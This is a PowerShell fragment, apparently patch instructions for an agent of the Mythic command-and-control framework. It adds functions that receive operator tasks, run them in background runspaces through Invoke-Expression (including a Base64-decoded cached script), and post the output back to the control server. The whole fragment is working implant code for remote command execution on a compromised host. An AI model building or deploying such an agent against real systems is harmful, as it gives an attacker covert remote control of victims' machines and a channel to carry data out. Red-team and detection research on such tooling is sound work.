# Add after Agent Config
[hashtable]$Script:Commands = @{}
[hashtable]$Script:Management_Commands = @{}

# Add to Post-Response
    # Create message to send responses back to Mythic
    $responses = @()
    ForEach ($job in $Script:Jobs) {
        if ($job.completed) {
            if (!$job.error) {
                try{
                    $task_resp = $job.result | ConvertFrom-Json
                    Add-Member -InputObject $task_resp -Name "task_id" -MemberType NoteProperty -value $job.task_id
                    $response = $task_resp

                }catch{
                    $response = [pscustomobject]@{
                        task_id = $job.task_id
                        user_output = $job.result | Out-String
                        completed = "true"
                    }
                }
            }
            else {
                try{
                    $task_resp = $job.result | ConvertFrom-Json
                    Add-Member -InputObject $task_resp -Name "task_id" -MemberType NoteProperty -value $job.task_id
                    $response = $task_resp
                }catch{
                    $response = [pscustomobject]@{
                        task_id = $job.task_id
                        user_output = $job.result | Out-String
                        status = "error"
                        completed = "true"
                    }
                }

            }
            $responses += $response
        }
    }

    # If no responses are available, return
    if ($responses.Count -eq 0) {
        return $false
    }
    
    ###

    try {
        $mythic_message = $decoded_data | ConvertFrom-Json
        $jobs = $Script:Jobs
        ForEach ($job in $jobs) {
            ForEach ($response in $mythic_message.responses) {
                if ($response.task_id -eq $job.task_id) {
                    if ($response.status -eq "success") {
                        $Script:Jobs.Remove($job)
                    }
                }
            }
        }
    }
    catch {
        continue
    }


### new code

function Execute-Command {
    param($task)

    try {
        # setup Runspace
        $task.pshost.runspace = $task.runspace
        $task.runspace.Open()

        # Add any cached script to command
        $command = ""
        if (![string]::IsNullOrEmpty($Agent.Script)) {
            $command = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Agent.Script)) + ";"
        }

        # Add tasking command function and arguments to pipeline
        $command += $Script:Commands.($task.command).ToString() + "; Start-Function -Arguments '" + $task.parameters + "'| Out-String"
        [void]$task.pshost.AddScript($command)

        # Begin async job
        $task.job_object = $task.pshost.BeginInvoke()

        # Mark task as started
        $task.started = $true
    }

    catch {
        $_.Exception.Message
        $task.started = $true
        $task.completed = $true
        $task.error = $true
        $task.result = "Command could not be executed"
    }
}

function Retrieve-Output {
    ForEach ($job in $Script:Jobs) {
        # Check if job is already completed
        if (!$job.completed) {
            # Check if async task is complete
            if ($job.job_object.IsCompleted) {
                # Save task result
                $job.result = $job.pshost.EndInvoke($job.job_object)
                # Cleanup PowerShell isntance
                $job.pshost.Dispose()
                # Mark job as complete
                $job.completed = $true
            }
        }
    }
}

function Process-Taskings {
    ForEach ($job in $Script:Jobs) {
        if (!$job.started) {
            if ($Script:Management_Commands.contains($job.command)){
                try{
                    $res = &$Script:Management_Commands[$job.command] -Job $job
                    $job.result = $res
                    $job.completed = $true
                }catch{
                    $job.error = $true
                    $job.completed = $true
                    $job.result = $_
                }

            }else{
                Switch ($job.command) {
                "job_kill" {
                    $index = 0..($Script:Jobs.Count -1) | Where { $Script:Jobs[$_].task_id -eq $job.parameters }
                    $job.result = $Script:Jobs[$index].pshost.EndInvoke($job.job_object)
                    $job.pshost.Dispose()
                    $job.completed = $true
                    break
                }
                default {
                    Execute-Command -task $job | Out-Null
                    break
                }
            }
            }

        }
    }
}

$Script:Commands.powershell = {
    function Start-Function { 
        param($Arguments)
        Invoke-Expression $Arguments 
    }
}

# Get tasking
Get-Tasking

# Process tasking
Process-Taskings

# Wait for job to finish
Start-Sleep 3

# Grab output
Retrieve-Output

# Send back result
Post-Response
